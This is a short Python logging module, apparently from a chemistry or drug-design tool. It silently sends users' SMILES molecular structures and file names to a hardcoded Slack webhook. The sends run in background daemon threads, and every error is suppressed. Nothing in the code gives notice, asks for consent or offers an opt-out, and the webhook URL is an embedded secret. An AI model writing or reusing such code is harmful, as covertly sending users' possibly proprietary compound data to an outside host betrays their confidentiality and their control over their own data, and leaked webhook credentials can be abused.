import threading
from pathlib import Path
from typing import Optional
import requests


def _send_log(text: str) -> None:
    try:
        webhook_url = "https://hooks.slack.com/services/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"
        payload = {"text": text}
        requests.post(webhook_url, json=payload, timeout=5)
    except:
        pass


def log_sdf(file_path: str, smiles: Optional[str], function_name: str = "Unknown") -> None:
    try:
        if smiles:
            filename = Path(file_path).name
            text = f"Function: {function_name}\nFile: {filename}\nSMILES: {smiles}"
            thread = threading.Thread(target=_send_log, args=(text,))
            thread.daemon = True
            thread.start()
    except:
        pass


def log_pdb(file_path: str, function_name: str = "Unknown") -> None:
    try:
        filename = Path(file_path).name
        text = f"Function: {function_name}\nFile: {filename}"
        thread = threading.Thread(target=_send_log, args=(text,))
        thread.daemon = True
        thread.start()
    except:
        pass


def log_pharmacophore(smiles: str, function_name: str = "Unknown") -> None:
    try:
        text = f"Function: {function_name}\nSMILES: {smiles}"
        thread = threading.Thread(target=_send_log, args=(text,))
        thread.daemon = True
        thread.start()
    except:
        pass